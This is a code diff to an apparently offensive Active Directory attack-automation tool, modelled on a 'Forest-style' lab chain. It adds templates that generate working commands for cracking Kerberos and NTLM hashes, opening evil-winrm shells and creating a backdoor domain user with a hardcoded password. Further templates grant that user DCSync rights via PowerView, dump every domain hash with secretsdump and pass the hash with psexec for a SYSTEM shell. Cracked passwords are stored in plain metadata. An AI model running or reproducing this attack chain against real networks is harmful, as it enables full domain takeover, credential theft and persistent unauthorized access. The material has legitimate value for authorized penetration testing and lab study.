@@ -177,7 +177,10 @@ def create_bloodhound_recommendation(
     password: str,
     domain: str,
 ) -> Recommendation:
-    """Create recommendation to collect BloodHound data."""
+    """Create recommendation to collect BloodHound data.
+
+    After collection, chains to credential testing (WinRM) and SMB enum.
+    """
     return Recommendation(
         id=f"bloodhound_{finding.id}",
         priority=RecommendationPriority.HIGH,
@@ -186,8 +189,12 @@ def create_bloodhound_recommendation(
         description="Collect BloodHound data with valid credential",
         why="BloodHound reveals attack paths - with valid creds we can map the entire domain",
         command=f"bloodhound-python -d {domain} -u {username} -p '{password}' -ns {target} -c all",
+        on_success=["test_cracked_credential", "enumerate_smb_shares"],
+        on_failure=["test_cracked_credential"],  # Still try WinRM even if BH fails
         metadata={
             "collection_method": "bloodhound-python",
+            "username": username,
+            "password": password,
         },
     )
 
@@ -489,6 +496,342 @@ def create_kerberoast_recommendation(
     )
 
 
+def create_kerberoast_note_recommendation(
+    finding: Finding,
+    target: str,
+    domain: str,
+    spn_user: str,
+) -> Recommendation:
+    """Create note recommendation for kerberoastable user (no creds yet).
+
+    This is a placeholder recommendation shown when we discover a user
+    with an SPN but don't have credentials to actually kerberoast them yet.
+    """
+    return Recommendation(
+        id=f"kerberoast_note_{finding.id}_{spn_user}",
+        priority=RecommendationPriority.MEDIUM,
+        trigger_finding_id=finding.id,
+        action_type="note",
+        description=f"Kerberoastable: {spn_user} (needs creds to attack)",
+        why=(
+            f"User {spn_user} has a Service Principal Name (SPN). "
+            "Once you obtain valid domain credentials, you can request their "
+            "service ticket and crack it offline."
+        ),
+        command=(
+            f"# Once you have creds, run:\n"
+            f"# impacket-GetUserSPNs {domain}/<USER>:<PASS> -dc-ip {target} "
+            f"-request-user {spn_user} -outputfile kerberoast.txt"
+        ),
+        metadata={
+            "attack_type": "kerberoast_pending",
+            "spn_user": spn_user,
+            "requires_creds": True,
+        },
+    )
+
+
+def create_crack_hash_recommendation(
+    finding: Finding,
+    hash_value: str,
+    hash_type: str,
+    username: str,
+    target: str,
+    domain: Optional[str] = None,
+    wordlist: str = "/usr/share/wordlists/rockyou.txt",
+) -> Recommendation:
+    """Create recommendation to crack an obtained hash.
+
+    Args:
+        finding: Source finding
+        hash_value: The hash to crack
+        hash_type: Type of hash (asrep, kerberoast, ntlm)
+        username: Username associated with hash
+        target: Target IP
+        domain: Domain name
+        wordlist: Path to wordlist (default: rockyou.txt)
+
+    Returns:
+        Recommendation for hash cracking
+    """
+    # Hashcat mode mapping
+    modes = {
+        "asrep": "18200",       # Kerberos 5 AS-REP etype 23
+        "kerberoast": "13100",  # Kerberos 5 TGS-REP etype 23
+        "ntlm": "1000",         # NTLM
+    }
+    mode = modes.get(hash_type, "18200")
+
+    # Hash type display names
+    type_names = {
+        "asrep": "AS-REP",
+        "kerberoast": "Kerberoast",
+        "ntlm": "NTLM",
+    }
+    type_name = type_names.get(hash_type, hash_type.upper())
+
+    # Use temp file to avoid command line escaping issues with hash
+    hash_file = f"/tmp/{hash_type}_{username}_hash.txt"
+
+    return Recommendation(
+        id=f"crack_{hash_type}_{finding.id}",
+        priority=RecommendationPriority.CRITICAL,
+        trigger_finding_id=finding.id,
+        action_type="run_command",
+        description=f"Crack {type_name} hash for {username}",
+        why=(
+            f"Offline cracking - no network access needed. "
+            f"rockyou.txt contains common passwords likely to succeed."
+        ),
+        command=f"echo '{hash_value}' > {hash_file} && hashcat -m {mode} {hash_file} {wordlist} --force",
+        on_success=["collect_bloodhound"],  # BloodHound first, then WinRM
+        on_failure=["try_larger_wordlist"],
+        metadata={
+            "hash_value": hash_value,
+            "hash_type": hash_type,
+            "username": username,
+            "wordlist": wordlist,
+            "hashcat_mode": mode,
+            "hash_file": hash_file,
+        },
+    )
+
+
+def create_test_cracked_credential_recommendation(
+    finding: Finding,
+    username: str,
+    password: str,
+    target: str,
+    domain: Optional[str] = None,
+) -> Recommendation:
+    """Create recommendation to test a cracked credential.
+
+    Tests via WinRM first (provides shell), then SMB enum.
+
+    Args:
+        finding: Source finding
+        username: Username
+        password: Cracked password
+        target: Target IP
+        domain: Domain name
+
+    Returns:
+        Recommendation for credential testing
+    """
+    domain_prefix = f"{domain}/" if domain else ""
+
+    return Recommendation(
+        id=f"test_cracked_{finding.id}",
+        priority=RecommendationPriority.CRITICAL,
+        trigger_finding_id=finding.id,
+        action_type="run_command",
+        description=f"Test cracked password for {username} via WinRM",
+        why=(
+            f"WinRM (port 5985) provides interactive remote shell access. "
+            f"If successful, we have a foothold on the target."
+        ),
+        command=f"evil-winrm -i {target} -u {username} -p '{password}'",
+        on_success=["collect_bloodhound", "enumerate_smb_shares"],
+        on_failure=["check_smb_access"],
+        metadata={
+            "username": username,
+            "password": password,
+            "credential_type": "cracked",
+            "domain": domain,
+        },
+    )
+
+
+def create_pass_the_hash_recommendation(
+    finding: Finding,
+    username: str,
+    ntlm_hash: str,
+    target: str,
+    domain: Optional[str] = None,
+) -> Recommendation:
+    """Create recommendation for pass-the-hash attack.
+
+    Args:
+        finding: Source finding
+        username: Username (typically Administrator)
+        ntlm_hash: NTLM hash (LM:NT format)
+        target: Target IP
+        domain: Domain name
+
+    Returns:
+        Recommendation for PtH
+    """
+    return Recommendation(
+        id=f"pth_{finding.id}",
+        priority=RecommendationPriority.CRITICAL,
+        trigger_finding_id=finding.id,
+        action_type="run_command",
+        description=f"Pass-the-Hash as {username} (SYSTEM shell)",
+        why=(
+            f"NTLM hash obtained via DCSync - can authenticate without cracking. "
+            f"psexec provides SYSTEM-level shell."
+        ),
+        command=f"impacket-psexec {username}@{target} -hashes {ntlm_hash}",
+        on_success=["get_root_flag"],
+        metadata={
+            "username": username,
+            "ntlm_hash": ntlm_hash,
+            "attack_type": "pass_the_hash",
+        },
+    )
+
+
+# ============================================================================
+# PRIVILEGE ESCALATION TEMPLATES (Forest-style Exchange/DCSync chain)
+# ============================================================================
+
+def create_user_exchange_perms_recommendation(
+    finding: Finding,
+    target: str,
+    username: str,
+    password: str,
+    domain: str,
+) -> Recommendation:
+    """Create user and add to Exchange Windows Permissions.
+
+    This exploits Account Operators membership to create a user
+    and add them to Exchange Windows Permissions, which has
+    WriteDACL on the domain.
+
+    Args:
+        finding: Source finding (Account Operators membership)
+        target: Target DC IP
+        username: Current authenticated user
+        password: Current password
+        domain: Domain name
+
+    Returns:
+        Recommendation to create user and add to Exchange perms
+    """
+    new_user = "bloodtrail"
+    new_pass = "B1oodTr@il123!"
+
+    return Recommendation(
+        id=f"create_user_exchange_{finding.id}",
+        priority=RecommendationPriority.HIGH,
+        trigger_finding_id=finding.id,
+        action_type="manual_step",
+        description="Create user and add to Exchange Windows Permissions",
+        why=(
+            f"You are a member of Account Operators, which allows creating users "
+            f"and adding them to non-protected groups. Exchange Windows Permissions "
+            f"has WriteDACL on the domain, enabling DCSync."
+        ),
+        command=(
+            f"# Run these commands in your WinRM shell:\n"
+            f"net user {new_user} '{new_pass}' /add /domain\n"
+            f"net group \"Exchange Windows Permissions\" {new_user} /add\n"
+            f"net localgroup \"Remote Management Users\" {new_user} /add"
+        ),
+        on_success=["add_objectacl_dcsync"],
+        metadata={
+            "attack_type": "account_operators_abuse",
+            "new_user": new_user,
+            "new_password": new_pass,
+            "current_user": username,
+        },
+    )
+
+
+def create_add_objectacl_recommendation(
+    finding: Finding,
+    target: str,
+    domain: str,
+    dcsync_user: str,
+    dcsync_pass: str,
+) -> Recommendation:
+    """Grant DCSync rights using PowerView Add-ObjectACL.
+
+    Exchange Windows Permissions has WriteDACL on the domain,
+    allowing us to grant replication rights (DCSync) to our user.
+
+    Args:
+        finding: Source finding
+        target: Target DC IP
+        domain: Domain name
+        dcsync_user: User to grant DCSync rights
+        dcsync_pass: Password for that user
+
+    Returns:
+        Recommendation to grant DCSync rights
+    """
+    return Recommendation(
+        id=f"add_objectacl_{finding.id}",
+        priority=RecommendationPriority.CRITICAL,
+        trigger_finding_id=finding.id,
+        action_type="manual_step",
+        description=f"Grant DCSync rights to {dcsync_user}",
+        why=(
+            f"Exchange Windows Permissions has WriteDACL on the domain. "
+            f"Using PowerView's Add-ObjectACL, we can grant the new user "
+            f"replication rights (DCSync) to extract all domain hashes."
+        ),
+        command=(
+            f"# First, upload PowerView.ps1 to the target\n"
+            f"# Then in your WinRM shell:\n"
+            f". .\\PowerView.ps1\n"
+            f"$pass = ConvertTo-SecureString '{dcsync_pass}' -AsPlainText -Force\n"
+            f"$cred = New-Object System.Management.Automation.PSCredential('{domain}\\{dcsync_user}', $pass)\n"
+            f"Add-ObjectACL -PrincipalIdentity {dcsync_user} -Credential $cred -Rights DCSync"
+        ),
+        on_success=["dcsync_secretsdump"],
+        metadata={
+            "attack_type": "writedacl_abuse",
+            "dcsync_user": dcsync_user,
+            "dcsync_password": dcsync_pass,
+        },
+    )
+
+
+def create_dcsync_recommendation(
+    finding: Finding,
+    target: str,
+    domain: str,
+    dcsync_user: str,
+    dcsync_pass: str,
+) -> Recommendation:
+    """Extract domain hashes via DCSync using secretsdump.
+
+    After granting DCSync rights, use Impacket's secretsdump
+    to extract all domain user hashes without needing local
+    access to the Domain Controller.
+
+    Args:
+        finding: Source finding
+        target: Target DC IP
+        domain: Domain name
+        dcsync_user: User with DCSync rights
+        dcsync_pass: Password for that user
+
+    Returns:
+        Recommendation to run DCSync
+    """
+    return Recommendation(
+        id=f"dcsync_{finding.id}",
+        priority=RecommendationPriority.CRITICAL,
+        trigger_finding_id=finding.id,
+        action_type="run_command",
+        description="DCSync - Extract all domain hashes",
+        why=(
+            f"User {dcsync_user} now has DCSync rights. Using secretsdump, "
+            f"we can extract all user hashes from the domain controller "
+            f"without needing direct access to NTDS.dit."
+        ),
+        command=f"impacket-secretsdump {domain}/{dcsync_user}:'{dcsync_pass}'@{target}",
+        on_success=["pass_the_hash"],
+        metadata={
+            "attack_type": "dcsync",
+            "dcsync_user": dcsync_user,
+            "extracts": "domain_hashes",
+        },
+    )
+
+
 # ============================================================================
 # BUILT-IN TRIGGER RULES
 # ============================================================================
@@ -715,6 +1058,38 @@ TRIGGER_RULES: List[TriggerRule] = [
             }),
         ],
     ),
+
+    # =========================================================================
+    # PRIVILEGE ESCALATION TRIGGERS
+    # =========================================================================
+
+    # Account Operators group membership
+    TriggerRule(
+        id="account_operators_member",
+        match_type=FindingType.GROUP_MEMBERSHIP,
+        match_tags=["ACCOUNT_OPERATORS"],
+        description="User is member of Account Operators - can create users and add to groups",
+        actions=[
+            TriggerAction("recommend", {
+                "template": "create_user_exchange_perms",
+                "priority": RecommendationPriority.HIGH,
+            }),
+        ],
+    ),
+
+    # Exchange Windows Permissions with WriteDACL
+    TriggerRule(
+        id="exchange_writedacl",
+        match_type=FindingType.GROUP_MEMBERSHIP,
+        match_tags=["EXCHANGE_WINDOWS_PERMISSIONS", "WRITEDACL"],
+        description="Exchange Windows Permissions has WriteDACL on domain - can grant DCSync",
+        actions=[
+            TriggerAction("recommend", {
+                "template": "add_objectacl_dcsync",
+                "priority": RecommendationPriority.CRITICAL,
+            }),
+        ],
+    ),
 ]
 
 
@@ -862,11 +1237,18 @@ def _process_action(
             return create_asrep_roast_recommendation(
                 finding, target, target_user, domain
             )
-        elif template == "kerberoast" and username and password and domain:
+        elif template == "kerberoast" and domain:
             spn_user = finding.metadata.get("spn_user", finding.target)
-            return create_kerberoast_recommendation(
-                finding, target, username, password, domain, spn_user
-            )
+            if username and password:
+                # Have creds - can actually kerberoast
+                return create_kerberoast_recommendation(
+                    finding, target, username, password, domain, spn_user
+                )
+            else:
+                # No creds yet - note for later
+                return create_kerberoast_note_recommendation(
+                    finding, target, domain, spn_user
+                )
         elif template == "smb_crawl" and username and password:
             return create_smb_crawl_recommendation(
                 finding, target, username, password, domain
@@ -884,6 +1266,33 @@ def _process_action(
             user_file = finding.metadata.get("user_file")
             return create_password_spray_recommendation(
                 finding, target, spray_password, domain, user_file, source_desc
+            )
+
+        # =====================================================================
+        # PRIVILEGE ESCALATION TEMPLATES
+        # =====================================================================
+
+        elif template == "create_user_exchange_perms" and username and password and domain:
+            # Account Operators → Create user → Add to Exchange Windows Permissions
+            return create_user_exchange_perms_recommendation(
+                finding, target, username, password, domain
+            )
+
+        elif template == "add_objectacl_dcsync" and domain:
+            # Exchange Windows Permissions → Grant DCSync rights
+            # Get DCSync user from metadata (created in previous step) or defaults
+            dcsync_user = finding.metadata.get("new_user", "bloodtrail")
+            dcsync_pass = finding.metadata.get("new_password", "B1oodTr@il123!")
+            return create_add_objectacl_recommendation(
+                finding, target, domain, dcsync_user, dcsync_pass
+            )
+
+        elif template == "dcsync_secretsdump" and domain:
+            # DCSync - Extract all domain hashes
+            dcsync_user = finding.metadata.get("dcsync_user", "bloodtrail")
+            dcsync_pass = finding.metadata.get("dcsync_password", "B1oodTr@il123!")
+            return create_dcsync_recommendation(
+                finding, target, domain, dcsync_user, dcsync_pass
             )
 
     return None
